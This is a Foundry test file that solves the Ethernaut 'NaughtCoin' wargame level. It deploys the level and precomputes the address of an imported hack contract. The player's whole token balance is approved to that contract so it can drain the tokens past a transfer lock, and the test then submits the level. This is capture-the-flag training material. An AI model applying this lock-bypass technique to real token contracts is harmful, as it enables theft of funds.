// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console2.sol";
import "../src/Ethernaut.sol";
import "../src/metrics/Statistics.sol";
import "../src/levels/NaughtCoinFactory.sol";
import "../src/levels/NaughtCoin.sol";
import "../src/levels/NaughtCoinHack.sol";

contract NaughtCoinTest is Test {
    using stdStorage for StdStorage;

    Ethernaut ethernaut;
    Statistics statistics;
    address eoa = address(0x1337);

    function setUp() public {
        ethernaut = new Ethernaut();

        // Statistics is actually deployed as upgradeable proxy
        // Deploying and initializing it normally for simplicity
        statistics = new Statistics();
        statistics.initialize(address(ethernaut));

        // Set Statistics contract on Ethernaut
        ethernaut.setStatistics(address(statistics));
    }

    function testNaughtCoinHack() public {
        /* Level Setup */
        // Deploy level factory: NaughtCoinFactory
        NaughtCoinFactory naughtCoinFactory = new NaughtCoinFactory();
        // Register level on Ethernaut
        ethernaut.registerLevel(naughtCoinFactory);

        // Set caller to custom address
        vm.startPrank(eoa);

        // Start recording logs to capture new level instance address
        vm.recordLogs();
        // Create new level instance via Ethernaut
        ethernaut.createLevelInstance(naughtCoinFactory);

        // Parse emitted logs
        Vm.Log[] memory entries = vm.getRecordedLogs();
        assertEq(
            entries[2].topics[0],
            keccak256("LevelInstanceCreatedLog(address,address,address)")
            // event LevelInstanceCreatedLog(address indexed player, address indexed instance, address indexed level);
        );
        Vm.Log memory levelNaughtCoinCreatedLog = entries[2];

        // Cast bytes32 log arg into address
        address instanceAddress = address(
            uint160(uint256(levelNaughtCoinCreatedLog.topics[2]))
        );
        emit log_named_address("instanceAddress", instanceAddress);

        // Instantiate level instance
        NaughtCoin instance = NaughtCoin(payable(instanceAddress));

        /* Level Hack */
        uint256 balance = instance.balanceOf(eoa);
        emit log_named_uint("balance", balance);
        assertTrue(balance == instance.totalSupply());

        uint256 nonce = vm.getNonce(address(eoa));
        emit log_named_uint("nonce", nonce); // 0
        address naughtCoinHackAddress = computeCreateAddress(eoa, nonce);
        emit log_named_address("naughtCoinHackAddress", naughtCoinHackAddress);

        instance.approve(naughtCoinHackAddress, balance);

        NaughtCoinHack naughtCoinHack = new NaughtCoinHack(instanceAddress);

        balance = instance.balanceOf(eoa);
        emit log_named_uint("balance", balance);
        assertTrue(balance == 0);

        /* Level Submit */
        // Start recording logs to capture level completed log
        vm.recordLogs();
        ethernaut.submitLevelInstance(payable(instanceAddress));

        // Parse emitted logs
        Vm.Log[] memory submitLogsEntries = vm.getRecordedLogs();
        assertEq(
            submitLogsEntries[1].topics[0],
            keccak256("LevelCompletedLog(address,address,address)")
            // event LevelCompletedLog(address indexed player, address indexed instance, address indexed level);
        );
        Vm.Log memory levelCompletedLog = submitLogsEntries[1];

        // Cast bytes32 log arg into address
        address playerAddress_ = address(
            uint160(uint256(levelCompletedLog.topics[1]))
        );
        emit log_named_address("playerAddress_", playerAddress_);

        address instanceAddress_ = address(
            uint160(uint256(levelCompletedLog.topics[2]))
        );
        emit log_named_address("instanceAddress_", instanceAddress_);

        assertEq(playerAddress_, eoa);
        assertEq(instanceAddress_, instanceAddress);

        vm.stopPrank();
    }
}
